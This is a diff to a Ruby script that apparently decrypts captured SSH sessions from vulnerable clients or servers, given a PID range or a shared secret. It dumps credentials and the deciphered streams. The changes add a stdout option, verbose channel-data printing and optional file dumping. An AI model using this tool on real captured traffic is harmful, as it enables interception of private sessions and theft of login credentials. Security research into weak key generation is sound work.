@@ -23,7 +23,7 @@
 
 require 'optparse'
 
-opts = {:pidrange => '0-0x7fff', :cpus => 1 }
+opts = {:pidrange => '0-0x7fff', :cpus => 1, :dumpfiles => true }
 $skip_bad_packet = false
 OptionParser.new { |o|
 	o.on('-n cpus', '--n-cpu cpus') { |i| opts[:cpus] = i.to_i }
@@ -32,6 +32,7 @@ OptionParser.new { |o|
 	o.on('-s', '--server', '--vulnerable-server') { |i| opts[:client] = false }
 	o.on('-c', '--client', '--vulnerable-client') { |i| opts[:client] = true }
 	o.on('-S shared_secret_hex', '--secret shared_secret_hex', '--shared-secret shared_secret_hex') { |i| opts[:shared] = i }
+	o.on('-d', '--stdout') { opts[:dumpfiles] = false }
 	o.on('--skip') { $skip_bad_packet = true }
 	o.on('-v') { $VERBOSE = true }
 }.parse!(ARGV)
@@ -97,7 +98,7 @@ class Stream
 		begin
 			# XXX if it doesnt work (invalid header blabla), try with ZLib::Inflate.new(-15) instead
 			@zlib = ZLib::Inflate.new(nil) if @compr == 'zlib'
-			nil while @ptr < @data.length and not ['DISCONNECT', 'NEWKEYS'].include? readpacket.type
+			nil while pkt = readpacket and @ptr < @data.length and not ['DISCONNECT', 'NEWKEYS'].include?(pkt.type)
 			puts if $VERBOSE
 		rescue
 			puts $!, $!.message, $!.backtrace
@@ -209,14 +210,11 @@ class SshPacket
 		when 'USERAUTH_SUCCESS'
 			@interpreted = {}
 		when 'CHANNEL_DATA'
-			@interpreted = { :wat => readint[], :data => readstr[] }
-			if @interpreted[:wat] == 0
-				@interpreted.delete :wat
-				p @interpreted[:data] if $VERBOSE
-				return
-			end
+			@interpreted = { :chan => readint[], :data => readstr[] }
+			puts "#@type #{@interpreted[:chan]}  #{@interpreted[:data].inspect}" if $VERBOSE
+			return
 		when 'CHANNEL_CLOSE'
-			@interpreted = { :foo => readint[] }
+			@interpreted = { :chan => readint[] }
 		else
 			@interpreted = { :data => read[@payload.length-1] }
 		end
@@ -457,8 +455,11 @@ else
 	raise 'unsupported HMAC'
 end
 
+puts "", " * Client to server stream" if $VERBOSE
 cs.readstream
+puts "", " * Server to client stream" if $VERBOSE
 ss.readstream
+puts " * End of streams", "" if $VERBOSE
 
 # dump credentials
 if ss['USERAUTH_SUCCESS']
@@ -472,9 +473,11 @@ if ss['USERAUTH_SUCCESS']
 	end
 end
 
-# dump streams
-i = 0
-i += 1 while File.exist?(cfile = "sshdecrypt.#{i}.client.dat") or File.exist?(sfile = "sshdecrypt.#{i}.server.dat")
-File.open(cfile, 'wb') { |fd| cs.packets.each { |p| fd.write p.payload } }
-File.open(sfile, 'wb') { |fd| ss.packets.each { |p| fd.write p.payload } }
-puts " * deciphered streams saved to #{cfile.inspect} & #{sfile.inspect}"
+if opts[:dumpfiles]
+	# dump streams
+	i = 0
+	i += 1 while File.exist?(cfile = "sshdecrypt.#{i}.client.dat") or File.exist?(sfile = "sshdecrypt.#{i}.server.dat")
+	File.open(cfile, 'wb') { |fd| cs.packets.each { |p| fd.write p.payload } }
+	File.open(sfile, 'wb') { |fd| ss.packets.each { |p| fd.write p.payload } }
+	puts " * deciphered streams saved to #{cfile.inspect} & #{sfile.inspect}"
+end
